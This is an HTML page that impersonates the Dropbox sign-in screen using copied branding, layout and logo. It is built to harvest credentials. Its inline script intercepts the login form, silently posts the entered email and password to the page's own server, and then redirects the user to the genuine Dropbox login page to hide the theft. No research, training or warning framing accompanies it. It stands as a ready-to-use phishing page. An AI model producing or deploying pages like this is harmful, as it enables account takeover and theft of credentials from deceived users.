<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Dropbox - Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Sharp Sans','Atlas Grotesk','Helvetica Neue',Helvetica,Arial,sans-serif;background:#f7f5f2}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:white;border-radius:8px;padding:48px;width:400px;box-shadow:0 4px 16px rgba(0,0,0,.08)}.logo{margin-bottom:32px;text-align:center}.logo svg{width:48px;height:48px;fill:#0061ff}.title{font-size:21px;font-weight:500;color:#1b2733;margin-bottom:24px}input{width:100%;padding:12px;border:1px solid #c1c7cd;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#0061ff;box-shadow:0 0 0 3px rgba(0,97,255,.15)}input[type="submit"]{background:#0061ff;color:white;border:none;font-weight:500;cursor:pointer;border-radius:6px}input[type="submit"]:hover{background:#0052d6}.link{text-align:center;margin-top:16px}.link a{color:#0061ff;text-decoration:none;font-size:14px}.link a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo"><svg viewBox="0 0 48 48"><path d="M24 2L12 10v10L24 12l12 8V10L24 2zm12 16l-12 8-12-8v10l12 8 12-8V18z"/></svg></div><div class="title">Sign in to Dropbox</div><form method="POST"><input type="email"name="email"placeholder="Email"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Sign in"></form><div class="link"><a href="#">Forgot your password?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.dropbox.com/login';});});</script></body></html>
